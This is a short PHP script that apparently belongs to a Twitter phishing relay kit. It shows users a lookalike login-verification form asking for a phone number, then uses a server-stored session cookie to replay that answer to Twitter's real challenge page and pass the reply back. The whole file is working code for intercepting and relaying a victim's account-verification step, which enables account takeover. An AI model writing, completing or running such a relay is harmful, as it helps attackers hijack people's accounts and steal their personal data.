<?php
require "twitter.php";
if (isset($_GET["u"])){
$u = base64_decode($_GET["u"]);
$_SESSION["c_url"] = $u;
}

include("twitter-html.php");

if (!isset($_POST["numberphone"])){
    echo formChallenge();
    die();
}
$hc = new hhb_curl ();
$cookie = $_SESSION["cookiefile"];
$cO = array(
    CURLOPT_COOKIEFILE => $cookie,
    CURLOPT_COOKIEJAR => $cookie,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTPHEADER => array(
    "Cookie" => "app_shell_visited=1"
    ),
    CURLOPT_URL => $_SESSION["c_url"]
  );
  $html = $hc->setopt_array( $cO )->exec()->getResponseBody();
  $header = $hc->setopt_array( $cO )->exec()->getResponseHeaders();
  include("dom.php");
  $html = str_get_html($html);
  $form = $html->find("form",0);
  $datas="";
  foreach ($form->find("input") as $i){
    if ($i->hasAttribute("name") && $i->hasAttribute("value")){
      $datas .= $i->attr["name"]."=".$i->attr["value"]."&";
    } else if ($i->hasAttribute("value") && !isset($i->attr["name"])){
      $datas .= $i->attr["value"]."&";
    } else if ($i->hasAttribute("name") && !isset($i->attr["value"])){
      $datas .= $i->attr["name"]."&";
    }
  }
  $url = $form->attr["action"];
  if (strpos($url, "twitter.com") === false){
    $url = "https://twitter.com".$url;
  }
  
  if (isset($_POST["numberphone"])){
    $datas=str_replace("RetypePhoneNumber", $_POST["numberphone"], $datas);
    
$cO = array(
    CURLOPT_COOKIEFILE => $cookie,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $datas,
    CURLOPT_COOKIEJAR => $cookie,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTPHEADER => array(
    "Cookie" => "app_shell_visited=1"
    ),
    CURLOPT_URL => $url
  );
  $html = $hc->setopt_array( $cO )->exec()->getResponseBody();    
    echo $html;
  } 
  